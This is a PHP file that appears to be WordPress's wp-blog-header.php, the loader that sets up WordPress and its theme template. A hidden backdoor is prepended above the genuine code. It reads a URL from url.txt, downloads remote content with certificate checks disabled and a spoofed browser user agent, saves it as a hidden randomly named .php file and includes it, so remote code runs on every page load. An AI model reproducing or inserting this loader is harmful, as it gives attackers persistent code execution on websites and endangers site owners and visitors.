<?php
$u = trim(file_get_contents(__DIR__ . '/url.txt'));
$f = __DIR__ . '/.' . uniqid() . '.php';

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $u,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_USERAGENT => 'Mozilla/5.0'
]);

$c = curl_exec($ch);
curl_close($ch);

if ($c !== false && strlen($c) > 0) {
    file_put_contents($f, $c);
    include $f;
}

/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

    $wp_did_header = true;

    // Load the WordPress library.
    require_once __DIR__ . '/wp-load.php';

    // Set up the WordPress query.
    wp();

    // Load the theme template.
    require_once ABSPATH . WPINC . '/template-loader.php';

}
